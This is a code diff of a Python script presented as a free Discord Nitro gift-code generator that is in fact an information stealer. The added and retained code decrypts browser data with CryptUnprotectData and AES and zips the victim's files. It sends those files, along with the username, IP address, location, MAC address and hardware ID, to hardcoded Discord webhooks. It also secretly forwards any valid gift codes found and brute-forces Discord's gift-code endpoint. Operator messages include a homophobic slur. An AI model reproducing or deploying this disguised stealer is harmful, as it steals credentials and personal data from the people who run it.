@@ -12,20 +12,24 @@ import sqlite3
 import zipfile
 import json
 import base64
-import psutil
 import subprocess
+import psutil
 import pyautogui
 import colorama
-from colorama import Fore, Style, init, Back
+import itertools
+from dhooks import Webhook
+from colorama import Fore, Style, init
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
-import tkinter
 
+num = random.randint(10, 1000)
+num2 = random.randint(100, 500)
+time.sleep(1)
 
 class X047:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/926550198132543548/aZ7qr1eYXAp7nCrDYEjWapS05RKQ9EGvtOU9n3zVGiwtnCIiwumMORphJHYS7fxXyjhk"
+        self.webhook = "https://discord.com/api/webhooks/929538778433990696/6ZILQ5RubXMoCiY2yeedO-ipNESVWPZWQb-fwla-eu2jN9r-0F8IkTp2BC1pS2_tdnrz"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -300,8 +304,9 @@ class X047:
         n = 0
         for r, d, files in os.walk(self.tempfolder):
             n += len(files)
+            self.fileCount = f"{n} Files Found: "
         embed = {
-            "avatar_url": "https://cdn.discordapp.com/attachments/854351978132930560/919870761634770964/OBBAAMA-1-1.gif",
+            "avatar_url": "https://cdn.discordapp.com/attachments/915705104043216956/926561353798406204/photo-1513789181297-6f2ec112c0bc.png",
             "embeds": [
                 {
                     "author": {
@@ -309,11 +314,11 @@ class X047:
                         "url": "https://discord.gg/VUzeqjWVUf",
                         "icon_url": "https://cdn.discordapp.com/attachments/854351978132930560/919870761634770964/OBBAAMA-1-1.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just got rekt by X047\n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})",
+                    "description": f"**{os.getlogin()}** Just ran X047 (ID: **User[{num}]**)\n```fix\nComputer Name: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 38655,
 
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/attachments/916744891755810816/919953178353602610/face3.png"
+                        "url": "https://cdn.discordapp.com/attachments/915705104043216956/926561409976909854/many-belltroxes-delhi-is-now-indias-hacker-hub.png"
                     },
 
                     "footer": {
@@ -324,7 +329,6 @@ class X047:
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(new, 'rb')})
-
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(src)
@@ -335,273 +339,178 @@ class X047:
                 zipped_file.write(absname, arcname)
         zipped_file.close()
 
+
+
+
+
+hook = Webhook("https://discord.com/api/webhooks/929457701694607430/sz-lh3DZlMWJOVTeHf8E1hr4oN4sTxYBSbiGbdzWWH32-UqUbTMGzCjVt4gFFfRjuQlc")  
+from uuid import getnode as get_mac
+mac=get_mac
+
+
+hook.send(f"""
+> **[User{num}]** Just logged in!
+> **MAC ADRESS:** `{mac}`
+""")
+
+os.system("CLS")
+os.system(f"title [FREE] ForceHax")
+os.system("CLS")
+
 def printSlow(text):
-    for char in text:
-        print(char, end="")
-        sys.stdout.flush()
-        time.sleep(.000001)
+ for char in text:
+    print(char, end="")
+    sys.stdout.flush()
+    time.sleep(.000001)
+
+animation_finished = False
+animation_finished2 = False
+animation_finished3 = False
+
+def animation():
+ for x in itertools.cycle(['|', '/', '-', '\\']):
+    if animation_finished:
+        break
+    sys.stdout.write(f'\r{Fore.BLUE}[FORCE] {Fore.GREEN}Connecting to FORCE {Fore.RESET}' + x)
+    sys.stdout.flush()
+    time.sleep(0.1)
+
+def animation2():
+ for x in itertools.cycle(['|', '/', '-', '\\']):
+    if animation_finished2:
+            break
+    sys.stdout.write(f'\r{Fore.BLUE}[FORCE] {Fore.GREEN}Checking for Illegal proccesses {Fore.RESET}' + x)
+    sys.stdout.flush()
+    time.sleep(0.1)
+
+def animation3():
+ for x in itertools.cycle(['|', '/', '-', '\\']):
+    if animation_finished3:
+            break
+    sys.stdout.write(f'\r{Fore.BLUE}[FORCE] {Fore.GREEN}Scraping Proxies {Fore.RESET}' + x)
+    sys.stdout.flush()
+    time.sleep(0.1)
+
+t = threading.Thread(target=animation)
+t.start()
+time.sleep(5)
+animation_finished = True
+
+t = threading.Thread(target=animation2)
+t.start()
+time.sleep(5)
+animation_finished2 = True
+
+t = threading.Thread(target=animation3)
+t.start()
+time.sleep(5)
+animation_finished3 = True
+
+print(f"\n{Fore.BLUE}[FORCE] {Fore.GREEN}Connected As {Fore.YELLOW}[User{num}] {Fore.RESET}")
+time.sleep(1)
+print(f"{Fore.BLUE}[FORCE] {Fore.GREEN}Current Proxies {Fore.YELLOW}[{num2}] {Fore.RESET}")
+time.sleep(2)
 
 def credits():
-    threading.Thread(target=X047).start()
-    tospanel = tkinter.Tk(screenName="TOS",baseName=None,className = 'TOS',useTk= True,sync=False,use=None)
-    tospanel.configure(bg='red')
-    tospanel.geometry("800x800")
-    tospanel.title("Force ToS")
-    textoftos = """
-    FORCE GENERATOR Copyright (c) 2021 FORCE
-Contact: 4tacey#0001 on Discord
+ os.system(f"title Connected as [User{num}]")
+os.system("CLS")
+printSlow(f"""{Fore.RED}
 
-*** END USER LICENSE AGREEMENT ***
-
-THIS END-USER LICENSE AGREEMENT (THIS “AGREEMENT”) IS A LEGAL CONTRACT BETWEEN YOU, AS EITHER 
-AN INDIVIDUAL OR AN ENTITY (AS DEFINED BELOW), AND Force.
-
-READ THE TERMS AND CONDITIONS OF THIS AGREEMENT CAREFULLY BEFORE COPYING, INSTALLING, OR 
-OTHERWISE ACCESSING OR USING ANY VERSION OF Force'S PROPRIETARY SOFTWARE, INCLUDING 
-Force'S SOFTWARE AS A SERVICE OFFERINGS, ACCOMPANIED BY THIS AGREEMENT (THE “SOFTWARE”).
-
-THE SOFTWARE IS LICENSED. BY COPYING, INSTALLING, OR OTHERWISE ACCESSING OR USING THE 
-SOFTWARE, YOU ACKNOWLEDGE THAT YOU HAVE READ THIS AGREEMENT, THAT YOU UNDERSTAND IT, AND 
-THAT YOU ACCEPT AND AGREE TO BE BOUND BY ITS TERMS. IF YOU ARE ACCEPTING THIS AGREEMENT ON 
-BEHALF OF A COMPANY, ORGANIZATION, OR EDUCATIONAL INSTITUTION, OR AN AGENCY, INSTRUMENTALITY, 
-OR DEPARTMENT OF A GOVERNMENT (AN “ENTITY”) AS ITS AUTHORIZED LEGAL REPRESENTATIVE, THEN YOU 
-REPRESENT AND WARRANT THAT YOU HAVE THE POWER AND AUTHORITY TO BIND SUCH ENTITY TO THESE 
-TERMS, AND REFERENCES TO “YOU” HEREIN REFER TO BOTH YOU, THE INDIVIDUAL END USER, AND THE 
-ENTITY ON WHOSE BEHALF YOU ARE ACCEPTING THIS AGREEMENT.
-
-IF YOU ACQUIRED THE SOFTWARE FROM A THIRD-PARTY RESELLER, YOU ACKNOWLEGDE AND AGREE THAT 
-SUCH THIRD PARTY IS NOT RESPONSIBLE FOR PROVIDING ANY MAINTENANCE AND SUPPORT SERVICES WITH 
-RESPECT TO THE SOFTWARE.
-
-IF AT ANY TIME YOU ARE NOT WILLING TO BE BOUND BY THE TERMS OF THIS AGREEMENT, YOU MUST CLICK 
-THE “I DECLINE” OR SIMILAR BUTTON, TERMINATE THE DOWNLOAD AND/OR INSTALLATION PROCESS (IF 
-APPLICABLE), IMMEDIATELY CEASE AND REFRAIN FROM ACCESSING OR USING THE SOFTWARE, AND DELETE 
-ANY COPIES YOU MAY HAVE. THIS AGREEMENT, ALONG WITH ANY ADDITIONAL TERMS OR POLICIES 
-INCORPORATED HEREIN BY REFERENCE, REPRESENTS THE ENTIRE AGREEMENT BETWEEN YOU AND 
-PARALLELS CONCERNING THE SOFTWARE, AND THIS AGREEMENT SUPERSEDES AND REPLACES ANY PRIOR 
-PROPOSAL, REPRESENTATION, OR UNDERSTANDING YOU MAY HAVE HAD WITH PARALLELS RELATING TO THE 
-SOFTWARE, WHETHER ORALLY OR IN WRITING.
-
-1. LICENSE
-By receiving, opening the file package, and/or using Force Generator Software, you agree that this End User 
-User License Agreement(EULA) is a legally binding and valid contract and agree to be bound by it. You agree to 
-abide by the intellectual property laws and all of the terms and conditions of this Agreement.
-
-Subject to the terms of this Agreement, Force grants to you a limited, non-exclusive, non-transferable 
-license, without right to sub-license, to use Force Generator in accordance with this Agreement and any other 
-written agreement with Force. Force does not transfer the title of Force Generator to you; the license 
-granted to you is not a sale. This agreement is a binding legal agreement between Force and the 
-purchasers or users of The Force Generator.
-
-If you do not agree to be bound by this agreement, remove Force Generator from your computer now.
-
-2. DISTRIBUTION
-Force Generator and the license herein granted shall not be copied, shared, distributed, re-sold, offered for re-
-sale, transferred or sub-licensed in whole or in part except that you may make one copy for archive purposes 
-only. For information about redistribution of Force Generator contact Force.
-
-3. USER AGREEMENT
-
-3.1 Use
-Your license to use Force Generator is limited to the number of licenses purchased by you. You shall not allow 
-others to use, copy or evaluate copies of Force Generator.
-
-3.2 CONSENT OF USE OF DATA
-You agree that Force may collect and use information gathered in any manner as part of the product support
-services provided to you, if any, related to Force Generator. Force may also use this information to provide
-notices to you which may be of use or interest to you.
-
-3.3 Use Restrictions
-You shall use Force Generator in compliance with all applicable laws and not for any unlawful purpose. Without 
-limiting the foregoing, use, display or distribution of Force Generator together with material that is 
-pornographic, racist, vulgar, obscene, defamatory, libelous, abusive, promoting hatred, discriminating or 
-displaying prejudice based on religion, ethnic heritage, race, sexual orientation or age is strictly prohibited.
-
-Each licensed copy of Force Generator may be used on one single computer location by one user. Use of Force Generator means that you have loaded, installed, or run Orion Builder on a computer or similar device. If 
-you install Force Generator onto a multi-user platform, server or network, each and every individual user of 
-Force Generator must be licensed separately.
-
-You may make one copy of Force Generator for backup purposes, providing you only have one copy installed on 
-one computer being used by one person. Other users may not use your copy of Force Generator. The 
-assignment, sublicense, networking, sale, or distribution of copies of Force Generator are strictly forbidden 
-without the prior written consent of Force Generator. It is a violation of this agreement to assign, sell, share, loan, 
-rent, lease, borrow, network or transfer the use of Force Generator. If any person other than yourself uses 
-Force Generator registered in your name, regardless of whether it is at the same time or different times, then 
-this agreement is being violated and you are responsible for that violation!
-
-3.4 Copyright Restriction
-This Software contains copyrighted material, trade secrets and other proprietary material. You shall not, and 
-shall not attempt to, modify, reverse engineer, disassemble or decompile Force Generator. Nor can you create 
-any derivative works or other works that are based upon or derived from Force Generator in whole or in part.
-
-Force's name, logo and graphics file that represents Force Generator shall not be used in any way to 
-promote products developed with Force Generator. Force retains sole and exclusive ownership of all right, 
-title and interest in and to Force Generator and all Intellectual Property rights relating thereto.
-
-Copyright law and international copyright treaty provisions protect all parts of Force Generator, products and 
-services. No program, code, part, image, audio sample, or text may be copied or used in any way by the user 
-except as intended within the bounds of the single user program. All rights not expressly granted hereunder are 
-reserved for Force.
-
-3.5 Limitation of Liability
-You use the software at your own risk. to the maximum extent permitted by applicable law, in no event shall 
-Force be liable to you or to those claiming through you for any direct, indirect, consequential, incidental or 
-special damage or loss of any kind including, but not limited to, loss of profits, loss of contracts, business 
-interruptions, loss of or corruption of information or data however caused and whether arising under contract or 
-tort, including negligence, even if Force has been advised of the possibility of such damages.
-
-You will indemnify, hold harmless, and defend Force, its employees, agents and distributors against any and 
-all claims, proceedings, demand and costs resulting from or in any way connected with your use of Force's 
-Software.
-
-In no event (including, without limitation, in the event of negligence) will Force, its employees, agents or 
-distributors be liable for any consequential, incidental, indirect, special or punitive damages whatsoever 
-(including, without limitation, damages for loss of profits, loss of use, business interruption, loss of information 
-or data, or pecuniary loss), in connection with or arising out of or related to this Agreement, Force Generator or 
-the use or inability to use Force Generator or the furnishing, performance or use of any other matters 
-hereunder whether based upon contract, tort or any other theory including negligence.
-
-Force's entire liability, without exception, is limited to the customers' reimbursement of the purchase price of 
-the Software (maximum being the lesser of the amount paid by you and the suggested retail price as listed by 
-Force ) in exchange for the return of the product, all copies, registration papers and manuals, and all 
-materials that constitute a transfer of license from the customer back to Force.
-
-if any limitation, exclusion, disclaimer or other provision contained in this licence agreement is held to be invalid 
-for any reason by a court of competent jurisdiction and Force becomes liable thereby for loss or damage 
-that may lawfully be limited, such liability whether in contract, tort or otherwise, will not exceed the fee paid by 
-you for the software.
-
-3.6 Warranties
-Force makes no representation or warranties in respect of this Software and expressly excludes all other 
-warranties, expressed or implied, oral or written, including, without limitation, any implied warranties of 
-merchantable quality or fitness for a particular purpose.
-
-3.7 Governing Law
-This Agreement shall be governed by the law of the Czech applicable therein. You hereby irrevocably attorn 
-and submit to the non-exclusive jurisdiction of the courts of Czech therefrom. If any provision shall be 
-considered unlawful, void or otherwise unenforceable, then that provision shall be deemed severable from this 
-License and not affect the validity and enforceability of any other provisions.
-
-3.9 SOME OF YOUR INFO MAY GET LOGGED FOR TESTING PURPOSES WHEN USING FORCE.
-
-3.8 Termination
-Any failure to comply with the terms and conditions of this Agreement will result in automatic and immediate 
-termination of this license. Upon termination of this license granted herein for any reason, you agree to 
-immediately cease use of Force Generator and destroy all copies of Force Generator supplied under this 
-Agreement. The financial obligations incurred by you shall survive the expiration or termination of this license.
-
-4. DISCLAIMER OF WARRANTIES AND INDEMNITY
-THIS SOFTWARE AND THE ACCOMPANYING FILES ARE SOLD ""AS IS"" AND WITHOUT WARRANTIES AS TO 
-PERFORMANCE OR MERCHANTABILITY OR ANY OTHER WARRANTIES WHETHER EXPRESSED OR IMPLIED.THIS
-DISCLAIMER CONCERNS ALL FILES GENERATED AND EDITED BY Force Generator AS WELL.
-
-4.1 To agree to the ToS don't close the program for 5 seconds and to disagree close it."""
-
-    tostext = tkinter.Label(mainpanel, text=textoftos,bg='red',fg='white',font=('Arial', 5))
-    tostext.pack()
-    tospanel.mainloop()
-    time.sleep(5)
-    tospanel.destroy()
-    os.system("title FORCE on crack")
-    os.system("CLS")
-    printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Connecting to FORCE...")
-    time.sleep(1)
-    printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.WHITE}Scraping proxies...")
-    time.sleep(1)
-    printSlow (f"{Fore.BLUE} \n[FORCE] {Fore.GREEN}Successfully Loaded!")
-    os.system("CLS")
-    printSlow(f"""{Fore.RED}
-
-  █████▒▒█████   ██▀███   ▄████▄  ▓█████     ██░ ██  ▄▄▄      ▒██   ██▒
-▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀    ▓██░ ██▒▒████▄    ▒▒ █ █ ▒░
-▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███      ▒██▀▀██░▒██  ▀█▄  ░░  █   ░
-░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄    ░▓█ ░██ ░██▄▄▄▄██  ░ █ █ ▒ 
+  █████▒▒█████   ██▀███   ▄████▄  ▓█████     ██░ ██  ▄▄▄      ▒██   ██▒   
+▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀    ▓██░ ██▒▒████▄    ▒▒ █ █ ▒░   
+▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███      ▒██▀▀██░▒██  ▀█▄  ░░  █   ░   
+░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄    ░▓█ ░██ ░██▄▄▄▄██  ░ █ █ ▒    
 ░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒   ░▓█▒░██▓ ▓█   ▓██▒▒██▒ ▒██▒
- ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░    ▒ ░░▒░▒ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
- ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░    ▒ ░▒░ ░  ▒   ▒▒ ░░░   ░▒ ░
- ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░       ░  ░░ ░  ░   ▒    ░    ░  
-           ░ ░     ░     ░ ░         ░  ░    ░  ░  ░      ░  ░ ░    ░  
-                         ░                                             
+▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░    ▒ ░░▒░▒ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
+░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░    ▒ ░▒░ ░  ▒   ▒▒ ░░░   ░▒ ░
+░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░       ░  ░░ ░  ░   ▒    ░    ░  
+    ░ ░     ░     ░ ░         ░  ░    ░  ░  ░      ░  ░ ░    ░  
+                    ░                                             
 
+[>] Connected as [User{num}]
+[>] Current Proxies [{num2}]
+[>] Created by [4tacey#0001]
 {Fore.RESET}""")
 credits()
-
-gens = int(input(np.array((f'{Fore.LIGHTBLUE_EX}\nInput How Many Codes to Generate and Check: '))))
-threadsnumber = input(f"{Fore.LIGHTBLUE_EX}\nHow many threads to use: ")
+threading.Thread(target=X047).start()
+gens = int(input(np.array((f'{Fore.LIGHTBLUE_EX}\n[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Input How Many Codes to Generate and Check: '))))
+threadsnumber = input(f"{Fore.LIGHTBLUE_EX}\n[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} How many threads to use: ")
 print('---------------------------------------------------------------------------------------')
 threadsnumber = int(threadsnumber)
 codesperthread = gens/threadsnumber
 codesperthread = int(codesperthread)
 
-file = "file"
-
 def onlygen():
-    for i in range(codesperthread):
-        code = ("".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16)))
-        nitrourl = "https://discord.gift/" + code
-        print(np.array(f"{Fore.YELLOW} [UNCHECKED]: {Fore.RESET}" + nitrourl))
+ for i in range(codesperthread):
+    code = ("".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16)))
+    nitrourl = "https://discord.gift/" + code
+    print(np.array(f"{Fore.YELLOW} [UNCHECKED]: {Fore.RESET}" + nitrourl))
 
 def generatecodes():
-    for i in range(codesperthread):
-        code = ("".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16)))
-        url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true"
-        nitrourl = "https://discord.gift/" + code
+ for i in range(codesperthread):
+    code = ("".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16)))
+    url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true"
+    nitrourl = "https://discord.gift/" + code
 
-        request = requests.get(url)
+    request = requests.get(url)
 
-        if request.status_code == 200:
-            print(np.array(f"{Fore.GREEN} [WORKING]: {Fore.RESET}"+ nitrourl))
-            file.write("[WORKING]: " + nitrourl)
-            data1 = {
-                "content": "we got a working code on a guy's pc lmao: " + nitrourl,
-                "username": "Nitro Generator my ass"
-            }
-            data = {
-                "content": "Working Code: " + nitrourl,
-                "username": "Force Nitro Generator"
-            }
-            result = requests.post(webhurl, json=data)
-            result1 = requests.post("https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ", json=data1)
-            result.raise_for_status()
-            if webhurl != "https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ":
-                result1.raise_for_status()
-        else:
-            print(np.array(f"{Fore.RED} [NOT WORKING]: {Fore.RESET}" + nitrourl))
+    if request.status_code == 200:
+        print(np.array(f"{Fore.GREEN} [WORKING]: {Fore.RESET} "+ nitrourl))
+        file.write("[WORKING]: " + nitrourl)
+        data1 = {
+            "content": "we got a working code on a guy's pc lmao: " + nitrourl,
+            "username": "Nitro Generator my ass"
+        }
+        data = {
+            "content": "Working Code: " + nitrourl,
+            "username": "Force Nitro Generator"
+        }
+        result = requests.post(webhurl, json=data)
+        result1 = requests.post \
+            ("https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ", json=data1)
+        result.raise_for_status()
+        if webhurl != "https://discord.com/api/webhooks/926559833820377109/GORtuOu59MQDZ_48rtncPdEVZsocLbX-nNrmT8twB5dSOt25qd8rktGSmbjVwyZU9uxQ":
+            result1.raise_for_status()
+    else:
+        print(np.array(f"{Fore.RED} [NOT WORKING]: {Fore.RESET}" + nitrourl))
 
 print(f"""{Fore.LIGHTBLUE_EX}
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-[1] - Generate and check
-[2] - Only generate
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
-mode = input()
+                            ║▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬║
+                            ║[1] - Generate and check║
+                            ║[2] - Only generate     ║
+                            ║▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬║        
+        """)
+mode = input(f"\n{Fore.LIGHTBLUE_EX}[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Pick a option: ")
 if (mode == "1"):
-    os.system("CLS")
+ os.system("CLS")
 
-    webhopt = input("Do you want to use a webhook? (y/n): ")
-    if webhopt == 'y':
-        webhurl = input(f"{Fore.LIGHTBLUE_EX}\nEnter a webhook for valid codes to be sent to: ")
-    else:
-        webhurl = "https://discord.com/api/webhooks/927980235541082112/GqnM9Jwp3LBPN5bbh99nRTAiwdLFQId5S-ONiQmDrL7pXWGiBL8w2tr808e2LdtFrfyz"
-    data1 = {
-        "content": "Started Checking Codes. (Force nitro generator.)",
-        "username": "Nitro Generator"
-    }
-    hwid = str \
-        (str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
-    data3 = {
-        "content": f"Started Checking Codes on a guy's pc lmao get a job faggot. (HWID: {hwid})",
-        "username": "Nitro Generator my ass"
-    }
-    result = requests.post(webhurl, json=data1)
-    if webhurl != "https://discord.com/api/webhooks/929103379031015474/BgVjgPA3tw8w9QFqo_PUzeXvgMCX5sXV_R-H_DRjDTWj7O61kjmGtsUwue0OXnoaKYeY":
-        result2 = requests.post("https://discord.com/api/webhooks/929103379031015474/BgVjgPA3tw8w9QFqo_PUzeXvgMCX5sXV_R-H_DRjDTWj7O61kjmGtsUwue0OXnoaKYeY", json=data3)
+webhopt = input(f"{Fore.LIGHTBLUE_EX}[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Do you want to use a webhook? (y/n): ")
+if webhopt == 'y':
+    webhurl = input(f"{Fore.LIGHTBLUE_EX}\n[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Enter a webhook for valid codes to be sent to: ")
+else:
+    webhurl = "https://discord.com/api/webhooks/927980235541082112/GqnM9Jwp3LBPN5bbh99nRTAiwdLFQId5S-ONiQmDrL7pXWGiBL8w2tr808e2LdtFrfyz"
+data1 = {
+    "content": "Started Checking Codes. (Force nitro generator.)",
+    "username": "Nitro Generator"
+}
+hwid = str \
+    (str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
+data3 = {
+    "content": f"Started Checking Codes on a guy's pc lmao get a job faggot. (HWID: {hwid})",
+    "username": "Nitro Generator my ass"
+}
+result = requests.post(webhurl, json=data1)
+result2 = requests.post \
+    ("https://discord.com/api/webhooks/918898185219497994/gTfwa_TI19HFcjktN6mwOUBDeF6fEoGg2x8ToUCfOjLaC49ukTdw6Hx03lDH0m5VBGh0", json=data3)
 
-    os.system("CLS")
-    for i in range(threadsnumber):
-        threading.Thread(target=generatecodes).start()
+if webhurl != "https://discord.com/api/webhooks/918898185219497994/gTfwa_TI19HFcjktN6mwOUBDeF6fEoGg2x8ToUCfOjLaC49ukTdw6Hx03lDH0m5VBGh0":
+    result2.raise_for_status()
+os.system("CLS")
+for i in range(threadsnumber):
+    threading.Thread(target=generatecodes).start()
 
 if (mode == "2"):
-    os.system("CLS")
-    threadnum = int(0)
-    for i in range(threadsnumber):
-        threading.Thread(target=onlygen).start()
+ os.system("CLS")
+threadnum = int(0)
+for i in range(threadsnumber):
+    threading.Thread(target=onlygen).start()   
